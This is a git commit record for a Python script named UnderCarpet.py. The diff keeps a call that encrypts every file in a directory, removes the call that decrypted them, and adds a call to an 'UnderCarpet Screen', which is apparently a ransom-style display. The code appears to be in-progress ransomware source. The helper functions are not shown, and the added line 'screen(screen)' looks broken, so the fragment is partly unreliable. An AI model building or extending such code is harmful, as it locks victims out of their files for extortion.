1d58860173a0cd755a01f2816e961c8191241c82
CR7 <jfmamjjasond_mtwtfss_@outlook.com>
2024-06-10 17:16:27 -0300

    Update UnderCarpet.py

--- UnderCarpet.py
+++ UnderCarpet.py
@@ -5,7 +5,5 @@ from commands import *
 # Encrypt all files in the directory
 encrypt_directory(directory, key)
 
-
-
-# Decrypt all files in the directory
-decrypt_directory(directory, key)
+# UnderCarpet Screen
+screen(screen)
